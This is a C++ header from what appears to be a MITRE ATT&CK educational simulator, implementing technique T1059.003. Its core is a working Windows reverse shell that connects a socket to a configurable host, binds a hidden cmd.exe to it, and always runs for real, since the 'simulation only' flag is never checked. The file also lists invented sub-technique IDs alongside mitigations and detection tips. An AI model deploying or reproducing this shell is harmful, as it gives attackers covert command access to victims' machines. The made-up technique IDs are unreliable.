/*
 * This file is part of Kibrit - MITRE ATT&CK Educational Simulator
 * Copyright (c) 2025 vxintelligence and contributors
 *
 * Licensed under the Kibrit Non-Commercial Educational License.
 * See LICENSE file in the project root for full license information.
 *
 * This software is for educational and research purposes only.
 * Commercial use is prohibited without explicit permission.
 */

#pragma once

#define _WINSOCKAPI_     // Prevent winsock.h being included by windows.h
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tchar.h>
#include <string>
#include <vector>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

namespace CyberSim {

    class TechniqueT1059_003 {
    public:
        struct TechniqueInfo {
            std::string id;
            std::string name;
            std::string tactic;
            std::string description;
            std::vector<std::string> platforms;
            std::string dataSource;
            bool isActive = false;
        };

    private:
        TechniqueInfo m_info;
        float m_progress = 0.0f;
        std::vector<std::string> m_logs;
        bool m_executed = false;

        std::string m_ipAddress = "127.0.0.1";
        int m_port = 4444;
        bool m_simulationOnly = true;

    public:
        TechniqueT1059_003() {
            m_info.id = "T1059.003";
            m_info.name = "Windows Command Shell - Reverse Shell";
            m_info.tactic = "Execution, Command and Control";
            m_info.description = "Reverse shell via cmd.exe with redirected std handles.";
            m_info.platforms = { "Windows" };
            m_info.dataSource = "Process monitoring, Network monitoring";
        }

        void SetIPAddress(const std::string& ip) {
            m_ipAddress = ip;
        }

        void SetPort(int port) {
            m_port = port;
        }

        void SetSimulationOnly(bool sim) {
            m_simulationOnly = sim;
        }

        bool Initialize() {
            m_logs.clear();
            m_logs.push_back("Initialized Technique T1059.003");
            m_progress = 0.0f;
            m_info.isActive = true;
            m_executed = false;
            return true;
        }

        void Execute() {
            if (!m_info.isActive || m_executed) return;

            m_logs.push_back("Execution started...");
            m_logs.push_back("Target: " + m_ipAddress + ":" + std::to_string(m_port));
            m_progress = 0.1f;

            
            m_logs.push_back("REAL MODE: Attempting real reverse shell connection...");
            RealReverseShell();

            m_progress = 1.0f;
            m_executed = true;
        }

        void SimulateShell() {
            m_logs.push_back("> Simulating reverse shell connection to " + m_ipAddress + ":" + std::to_string(m_port));
            m_logs.push_back("> Initializing socket...");
            m_logs.push_back("> Creating TCP socket...");
            m_logs.push_back("> Connecting to target...");
            m_logs.push_back("> Connection established.");
            m_logs.push_back("> Redirecting cmd.exe standard handles...");
            m_logs.push_back("> Launching cmd.exe with redirected I/O...");

            m_logs.push_back("");
            m_logs.push_back("--- Simulated Shell Commands ---");
            m_logs.push_back("> whoami");
            m_logs.push_back("DESKTOP-EXAMPLE\\User");
            m_logs.push_back("> hostname");
            m_logs.push_back("DESKTOP-EXAMPLE");
            m_logs.push_back("> ipconfig");
            m_logs.push_back("Windows IP Configuration");
            m_logs.push_back("Ethernet adapter Ethernet:");
            m_logs.push_back("   Connection-specific DNS Suffix  . : example.com");
            m_logs.push_back("   IPv4 Address. . . . . . . . . . . : 192.168.1.100");
            m_logs.push_back("   Subnet Mask . . . . . . . . . . . : 255.255.255.0");
            m_logs.push_back("   Default Gateway . . . . . . . . . : 192.168.1.1");
            m_logs.push_back("");
            m_logs.push_back("> Connection closed.");
            m_logs.push_back("Simulation complete.");
        }

        void RealReverseShell() {
            // This is the actual implementation that creates a real connection
            // Warning: This should only be used in controlled environments for educational purposes

            m_logs.push_back("Initializing connection components...");
            m_progress = 0.2f;

            WSADATA wsaData;
            SOCKET s1;
            sockaddr_in remoteAddr;
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;

            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                m_logs.push_back("WSAStartup failed");
                return;
            }
            m_logs.push_back("WSA initialized successfully.");
            m_progress = 0.3f;

            s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
            if (s1 == INVALID_SOCKET) {
                m_logs.push_back("WSASocket failed");
                WSACleanup();
                return;
            }
            m_logs.push_back("Socket created successfully.");
            m_progress = 0.4f;

            remoteAddr.sin_family = AF_INET;
            remoteAddr.sin_port = htons(m_port);
            // Use the modern inet_pton instead of deprecated inet_addr
            inet_pton(AF_INET, m_ipAddress.c_str(), &remoteAddr.sin_addr);

            m_logs.push_back("Connecting to " + m_ipAddress + ":" + std::to_string(m_port) + "...");
            m_progress = 0.5f;

            if (WSAConnect(s1, (SOCKADDR*)&remoteAddr, sizeof(remoteAddr), 0, 0, 0, 0) == SOCKET_ERROR) {
                m_logs.push_back("Connection failed. Make sure a listener is running at the target address.");
                closesocket(s1);
                WSACleanup();
                return;
            }

            m_logs.push_back("Connection established successfully!");
            m_progress = 0.7f;

            m_logs.push_back("Redirecting cmd.exe standard handles...");
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s1;
            si.wShowWindow = SW_HIDE;  // Hide the window for stealth

            ZeroMemory(&pi, sizeof(pi));

            m_logs.push_back("Launching cmd.exe with redirected I/O...");
            m_progress = 0.8f;

            // Start "cmd.exe" with its handles redirected to the socket
            if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                m_logs.push_back("CreateProcess failed. Error: " + std::to_string(GetLastError()));
                closesocket(s1);
                WSACleanup();
                return;
            }

            m_logs.push_back("cmd.exe launched successfully. Reverse shell established!");
            m_logs.push_back("The attacker now has command-line access to this system.");
            m_logs.push_back("Waiting for the shell session to end...");
            m_progress = 0.9f;

            // Wait for the cmd.exe process to exit
            WaitForSingleObject(pi.hProcess, INFINITE);

            m_logs.push_back("The shell session has ended.");
            m_progress = 1.0f;

            // Clean up resources
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            closesocket(s1);
            WSACleanup();
            m_logs.push_back("Resources cleaned up. Reverse shell demonstration complete.");
        }

        float GetProgress() const {
            return m_progress;
        }

        std::vector<std::string> GetLogs() const {
            return m_logs;
        }

        void Reset() {
            m_logs.clear();
            m_progress = 0.0f;
            m_executed = false;
            m_logs.push_back("Technique reset.");
        }

        void Stop() {
            m_info.isActive = false;
            m_logs.push_back("Technique stopped.");
        }

        TechniqueInfo GetInfo() const {
            return m_info;
        }

        // Educational information methods

        std::vector<std::string> GetSubTechniques() const {
            return {
                "T1059.003.001 - Interactive Command Shell",
                "T1059.003.002 - Reverse Shell",
                "T1059.003.003 - Bind Shell",
                "T1059.003.004 - Command-Line Interface"
            };
        }

        std::vector<std::string> GetMitigations() const {
            return {
                "M1042 - Disable or Remove Feature or Program: Disable command-line interpreters if not needed",
                "M1038 - Execution Prevention: Use application control solutions to block cmd.exe execution from unusual locations",
                "M1026 - Privileged Account Management: Restrict administrator accounts from using cmd.exe",
                "M1018 - User Account Management: Limit user permissions to execute shell commands",
                "M1030 - Network Segmentation: Implement proper network segmentation to prevent outbound connections",
                "M1031 - Network Intrusion Prevention: Use firewalls to block unauthorized outbound connections",
                "M1049 - Antivirus/Antimalware: Deploy solutions that can detect reverse shell techniques"
            };
        }

        std::vector<std::string> GetDetectionMethods() const {
            return {
                "Monitor process creation events involving cmd.exe, especially those with unusual parent processes",
                "Monitor network connections: Look for outbound connections from cmd.exe to unusual destinations",
                "Detect unusual handle redirection in cmd.exe processes",
                "Monitor for command shells with hidden windows (SW_HIDE)",
                "Watch for persistence mechanisms that establish reverse shells on startup",
                "Look for cmd.exe processes with no associated console window",
                "Use network traffic analysis to detect command and control traffic patterns"
            };
        }
    };

} // namespace CyberSim